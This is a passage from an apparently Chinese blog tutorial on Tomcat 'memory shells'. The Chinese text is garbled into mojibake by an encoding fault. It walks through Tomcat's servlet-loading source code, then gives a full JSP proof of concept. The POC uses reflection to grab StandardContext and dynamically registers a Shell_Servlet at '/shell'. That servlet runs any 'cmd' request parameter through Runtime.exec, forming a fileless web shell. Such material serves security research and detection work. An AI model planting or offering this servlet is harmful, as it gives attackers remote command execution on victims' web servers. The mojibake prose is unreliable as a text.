&#125;<br>            &#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;<br>                log.error(sm.getString(<span class="hljs-string">&quot;standardContext.managerFail&quot;</span>), e);<br>                ok = <span class="hljs-literal">false</span>;<br>            &#125;<br> <br>            <span class="hljs-comment">// Configure and call application filters</span><br>            <span class="hljs-keyword">if</span> (ok) &#123;<br>                <span class="hljs-keyword">if</span> (!filterStart()) &#123;<br>                    log.error(sm.getString(<span class="hljs-string">&quot;standardContext.filterFail&quot;</span>));<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br> <br>            <span class="hljs-comment">// Load and initialize all &quot;load on startup&quot; servlets</span><br>            <span class="hljs-keyword">if</span> (ok) &#123;<br>                <span class="hljs-keyword">if</span> (!loadOnStartup(findChildren()))&#123;<br>                    log.error(sm.getString(<span class="hljs-string">&quot;standardContext.servletFail&quot;</span>));<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br> <br> <br>            <span class="hljs-comment">// Start ContainerBackgroundProcessor thread</span><br>            <span class="hljs-built_in">super</span>.threadStart();<br>        &#125;<span class="hljs-keyword">if</span> (ok) &#123;<br>                <span class="hljs-keyword">if</span> (!listenerStart()) &#123;<br>                    log.error(sm.getString(<span class="hljs-string">&quot;standardContext.listenerFail&quot;</span>));<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br> <br> <br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// Start manager</span><br>                <span class="hljs-type">Manager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> getManager();<br>                <span class="hljs-keyword">if</span> (manager <span class="hljs-keyword">instanceof</span> Lifecycle) &#123;<br>                    ((Lifecycle) manager).start();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;<br>                log.error(sm.getString(<span class="hljs-string">&quot;standardContext.managerFail&quot;</span>), e);<br>                ok = <span class="hljs-literal">false</span>;<br>            &#125;<br> <br>            <span class="hljs-comment">// Configure and call application filters</span><br>            <span class="hljs-keyword">if</span> (ok) &#123;<br>                <span class="hljs-keyword">if</span> (!filterStart()) &#123;<br>                    log.error(sm.getString(<span class="hljs-string">&quot;standardContext.filterFail&quot;</span>));<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br> <br>            <span class="hljs-comment">// Load and initialize all &quot;load on startup&quot; servlets</span><br>            <span class="hljs-keyword">if</span> (ok) &#123;<br>                <span class="hljs-keyword">if</span> (!loadOnStartup(findChildren()))&#123;<br>                    log.error(sm.getString(<span class="hljs-string">&quot;standardContext.servletFail&quot;</span>));<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br> <br>            &#125;<br> <br>            <span class="hljs-comment">// Start ContainerBackgroundProcessor thread</span><br> <br>            <span class="hljs-built_in">super</span>.threadStart();<br> <br>        &#125;<br> <br>...<br></code></pre></td></tr></table></figure><h4 id="åˆ›å»ºStandardWrapper"><a href="#åˆ›å»ºStandardWrapper" class="headerlink" title="åˆ›å»ºStandardWrapper"></a>åˆ›å»ºStandardWrapper</h4><p>åœ¨<code>StandardContext</code>#<code>startInternal</code>ä¸­ï¼Œè°ƒç”¨äº†<code>fireLifecycleEvent()</code>æ–¹æ³•è§£æweb.xmlæ–‡ä»¶ï¼Œæˆ‘ä»¬è·Ÿè¿›</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-38.png" alt="img17"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">protected void fire<span class="hljs-constructor">LifecycleEvent(String <span class="hljs-params">type</span>, Object <span class="hljs-params">data</span>)</span> &#123;<br>        LifecycleEvent event = <span class="hljs-keyword">new</span> <span class="hljs-constructor">LifecycleEvent(<span class="hljs-params">this</span>, <span class="hljs-params">type</span>, <span class="hljs-params">data</span>)</span>;<br>        <span class="hljs-keyword">for</span> (LifecycleListener listener : lifecycleListeners) &#123;<br>            listener.lifecycle<span class="hljs-constructor">Event(<span class="hljs-params">event</span>)</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆé€šè¿‡<code>ContextConfig#webConfig()</code>æ–¹æ³•è§£æweb.xmlè·å–å„ç§é…ç½®å‚æ•°</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-42.png" alt="img18"></p><p>ç„¶åé€šè¿‡<code>configureContext(webXml)</code>æ–¹æ³•åˆ›å»ºStandWrapperå¯¹è±¡ï¼Œå¹¶æ ¹æ®è§£æå‚æ•°åˆå§‹åŒ–StandWrapperå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureContext</span><span class="hljs-params">(WebXml webxml)</span> &#123;<br>        <span class="hljs-comment">// As far as possible, process in alphabetical order so it is easy to</span><br>        <span class="hljs-comment">// check everything is present</span><br>        <span class="hljs-comment">// Some validation depends on correct public ID</span><br>        context.setPublicId(webxml.getPublicId());<br> <br>...   <span class="hljs-comment">//è®¾ç½®StandardContextå‚æ•°</span><br> <br>        <br>        <span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;<br> <br>            <span class="hljs-comment">//åˆ›å»ºStandardWrapperå¯¹è±¡</span><br>            <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper();<br> <br>            <span class="hljs-keyword">if</span> (servlet.getLoadOnStartup() != <span class="hljs-literal">null</span>) &#123;<br> <br>                <span class="hljs-comment">//è®¾ç½®LoadOnStartupå±æ€§</span><br>                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (servlet.getEnabled() != <span class="hljs-literal">null</span>) &#123;<br>                wrapper.setEnabled(servlet.getEnabled().booleanValue());<br>            &#125;<br> <br>            <span class="hljs-comment">//è®¾ç½®ServletNameå±æ€§</span><br>            wrapper.setName(servlet.getServletName());<br>            Map&lt;String,String&gt; params = servlet.getParameterMap();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;<br>                wrapper.addInitParameter(entry.getKey(), entry.getValue());<br>            &#125;<br>            wrapper.setRunAs(servlet.getRunAs());<br>            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();<br>            <span class="hljs-keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;<br>                wrapper.addSecurityReference(<br>                        roleRef.getName(), roleRef.getLink());<br>            &#125;<br> <br>            <span class="hljs-comment">//è®¾ç½®ServletClasså±æ€§</span><br>            wrapper.setServletClass(servlet.getServletClass());<br>            ...<br>            wrapper.setOverridable(servlet.isOverridable());<br> <br>            <span class="hljs-comment">//å°†åŒ…è£…å¥½çš„StandWrapperæ·»åŠ è¿›ContainerBaseçš„childrenå±æ€§ä¸­</span><br>            context.addChild(wrapper);<br> <br>           <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry :<br>                webxml.getServletMappings().entrySet()) &#123;<br>          <br>            <span class="hljs-comment">//æ·»åŠ è·¯å¾„æ˜ å°„</span><br>            context.addServletMappingDecoded(entry.getKey(), entry.getValue());<br>        &#125;<br>        &#125;<br>        ...<br>    &#125;<br></code></pre></td></tr></table></figure><p>æœ€åé€šè¿‡<code>addServletMappingDecoded()</code>æ–¹æ³•æ·»åŠ Servletå¯¹åº”çš„urlæ˜ å°„</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-43.png" alt="img19"></p><h4 id="åŠ è½½StandWrapper"><a href="#åŠ è½½StandWrapper" class="headerlink" title="åŠ è½½StandWrapper"></a>åŠ è½½StandWrapper</h4><p>æ¥ç€åœ¨<code>StandardContext#startInternal</code>æ–¹æ³•é€šè¿‡<code>findChildren()</code>è·å–<code>StandardWrapper</code>ç±»</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-39.png" alt="img20"></p><p>æœ€åä¾æ¬¡åŠ è½½å®ŒListenerã€Filteråï¼Œå°±é€šè¿‡<code>loadOnStartUp()</code>æ–¹æ³•åŠ è½½wrapper</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loadOnStartup</span><span class="hljs-params">(Container children[])</span> &#123;<br> <br>    <span class="hljs-comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span><br>    TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (Container child : children) &#123;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper) child;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">loadOnStartup</span> <span class="hljs-operator">=</span> wrapper.getLoadOnStartup();<br> <br>        <span class="hljs-comment">//åˆ¤æ–­å±æ€§loadOnStartupçš„å€¼</span><br>        <span class="hljs-keyword">if</span> (loadOnStartup &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> Integer.valueOf(loadOnStartup);<br>        ArrayList&lt;Wrapper&gt; list = map.get(key);<br>        <span class="hljs-keyword">if</span> (list == <span class="hljs-literal">null</span>) &#123;<br>            list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>            map.put(key, list);<br>        &#125;<br>        list.add(wrapper);<br>    &#125;<br> <br>    <span class="hljs-comment">// Load the collected &quot;load on startup&quot; servlets</span><br>    <span class="hljs-keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;<br>        <span class="hljs-keyword">for</span> (Wrapper wrapper : list) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                wrapper.load();<br>            &#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œå¯¹äºWrapperå¯¹è±¡ä¸­<code>loadOnStartup</code>å±æ€§çš„å€¼è¿›è¡Œåˆ¤æ–­ï¼Œåªæœ‰å¤§äº0çš„æ‰ä¼šè¢«æ”¾å…¥listè¿›è¡Œåç»­çš„<code>wrapper.load()</code>åŠ è½½è°ƒç”¨ã€‚</p><p>è¿™é‡Œå¯¹åº”çš„å®é™…ä¸Šå°±æ˜¯Tomcat Servletçš„æ‡’åŠ è½½æœºåˆ¶ï¼Œå¯ä»¥é€šè¿‡<code>loadOnStartup</code>å±æ€§å€¼æ¥è®¾ç½®æ¯ä¸ªServletçš„å¯åŠ¨é¡ºåºã€‚é»˜è®¤å€¼ä¸º-1ï¼Œæ­¤æ—¶åªæœ‰å½“Servletè¢«è°ƒç”¨æ—¶æ‰åŠ è½½åˆ°å†…å­˜ä¸­ã€‚</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-44.png" alt="img21"></p><p>è‡³æ­¤Servletæ‰è¢«åŠ è½½åˆ°å†…å­˜ä¸­ã€‚</p><h4 id="åŠ¨æ€æ³¨å†ŒServlet"><a href="#åŠ¨æ€æ³¨å†ŒServlet" class="headerlink" title="åŠ¨æ€æ³¨å†ŒServlet"></a>åŠ¨æ€æ³¨å†ŒServlet</h4><p>é€šè¿‡ä¸Šæ–‡çš„åˆ†ææˆ‘ä»¬èƒ½å¤Ÿæ€»ç»“å‡ºåˆ›å»ºServletçš„æµç¨‹</p><ol><li>è·å–<code>StandardContext</code>å¯¹è±¡</li><li>ç¼–å†™æ¶æ„Servlet</li><li>é€šè¿‡<code>StandardContext.createWrapper()</code>åˆ›å»º<code>StandardWrapper</code>å¯¹è±¡</li><li>è®¾ç½®<code>StandardWrapper</code>å¯¹è±¡çš„<code>loadOnStartup</code>å±æ€§å€¼</li><li>è®¾ç½®<code>StandardWrapper</code>å¯¹è±¡çš„<code>ServletName</code>å±æ€§å€¼</li><li>è®¾ç½®<code>StandardWrapper</code>å¯¹è±¡çš„<code>ServletClass</code>å±æ€§å€¼</li><li>å°†<code>StandardWrapper</code>å¯¹è±¡æ·»åŠ è¿›<code>StandardContext</code>å¯¹è±¡çš„<code>children</code>å±æ€§ä¸­</li><li>é€šè¿‡<code>StandardContext.addServletMappingDecoded()</code>æ·»åŠ å¯¹åº”çš„è·¯å¾„æ˜ å°„</li></ol><h4 id="è·å–StandardContextå¯¹è±¡-1"><a href="#è·å–StandardContextå¯¹è±¡-1" class="headerlink" title="è·å–StandardContextå¯¹è±¡"></a>è·å–StandardContextå¯¹è±¡</h4><p>StandardContextå¯¹è±¡è·å–æ–¹å¼å¤šç§å¤šæ ·</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br></code></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="ç¼–å†™æ¶æ„Servlet"><a href="#ç¼–å†™æ¶æ„Servlet" class="headerlink" title="ç¼–å†™æ¶æ„Servlet"></a>ç¼–å†™æ¶æ„Servlet</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%!<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br> <br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="åˆ›å»ºWrapperå¯¹è±¡"><a href="#åˆ›å»ºWrapperå¯¹è±¡" class="headerlink" title="åˆ›å»ºWrapperå¯¹è±¡"></a>åˆ›å»ºWrapperå¯¹è±¡</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Shell_Servlet</span> <span class="hljs-variable">shell_servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Servlet</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> shell_servlet.getClass().getSimpleName();<br> <br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>    wrapper.setName(name);<br>    wrapper.setServlet(shell_servlet);<br>    wrapper.setServletClass(shell_servlet.getClass().getName());<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="å°†Wrapperæ·»åŠ è¿›StandardContext"><a href="#å°†Wrapperæ·»åŠ è¿›StandardContext" class="headerlink" title="å°†Wrapperæ·»åŠ è¿›StandardContext"></a>å°†Wrapperæ·»åŠ è¿›StandardContext</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    standardContext.addChild(wrapper);<br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,name);<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="å®Œæ•´POC-2"><a href="#å®Œæ•´POC-2" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br> <br>&lt;%!<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br> <br>%&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Shell_Servlet</span> <span class="hljs-variable">shell_servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Servlet</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> shell_servlet.getClass().getSimpleName();<br> <br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>    wrapper.setName(name);<br>    wrapper.setServlet(shell_servlet);<br>    wrapper.setServletClass(shell_servlet.getClass().getName());<br>%&gt;<br> <br>&lt;%<br>    standardContext.addChild(wrapper);<br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,name);<br>%&gt;<br></code></pre></td></tr></table></figure><p>è®¿é—®Servlet.jspåŠ¨æ€æ³¨å†ŒServlet</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-45.png" alt="img22"></p><p>è®¿é—®å¯¹åº”è·¯å¾„çš„Servletå‘½ä»¤æ‰§è¡Œ</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-46.png" alt="img23"></p><p>Servletå‹å†…å­˜é©¬çš„ç¼ºç‚¹å°±æ˜¯å¿…é¡»è¦è®¿é—®å¯¹åº”çš„è·¯å¾„æ‰èƒ½å‘½ä»¤æ‰§è¡Œï¼Œæ˜“è¢«å‘ç°ã€‚</p><h3 id="Valveå‹"><a href="#Valveå‹" class="headerlink" title="Valveå‹"></a>Valveå‹</h3><h4 id="ä»€ä¹ˆæ˜¯valveï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯valveï¼Ÿ" class="headerlink" 